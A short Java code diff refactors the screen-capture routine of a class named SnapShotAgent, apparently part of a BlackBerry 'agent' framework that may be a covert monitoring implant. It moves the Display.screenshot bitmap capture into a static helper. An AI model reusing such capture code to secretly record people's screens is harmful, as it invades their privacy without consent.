@@ -98,23 +98,7 @@ public final class SnapShotAgent extends Agent {
             return;
         }
 
-        final Bitmap bitmap;
-        synchronized (this) {
-            final int width = Display.getWidth();
-            final int height = Display.getHeight();
-            bitmap = new Bitmap(width, height);
-
-            //#ifdef DEBUG_TRACE
-            debug
-                    .trace("portrait: "
-                            + (Display.getOrientation() == Display.ORIENTATION_PORTRAIT));
-            debug.trace("w: " + width + " h:" + height);
-            debug.trace("horizontal res: " + Display.getHorizontalResolution());
-            debug.trace("Rowwise: " + Display.isRowwise());
-            //#endif
-
-            Display.screenshot(bitmap, 0, 0, width, height);
-        }
+        final Bitmap bitmap = getScreenshot();
 
         //#ifdef DEBUG_TRACE
         debug.trace("screenshot");
@@ -140,6 +124,30 @@ public final class SnapShotAgent extends Agent {
 
         //#endif
 
+    }
+
+    /**
+     * @return
+     */
+    public synchronized static Bitmap getScreenshot() {
+        final Bitmap bitmap;
+ 
+            final int width = Display.getWidth();
+            final int height = Display.getHeight();
+            bitmap = new Bitmap(width, height);
+
+            //#ifdef DEBUG_TRACE
+            debug
+                    .trace("portrait: "
+                            + (Display.getOrientation() == Display.ORIENTATION_PORTRAIT));
+            debug.trace("w: " + width + " h:" + height);
+            debug.trace("horizontal res: " + Display.getHorizontalResolution());
+            debug.trace("Rowwise: " + Display.isRowwise());
+            //#endif
+
+            Display.screenshot(bitmap, 0, 0, width, height);
+        
+        return bitmap;
     }
 
     private byte[] getAdditionalData() {
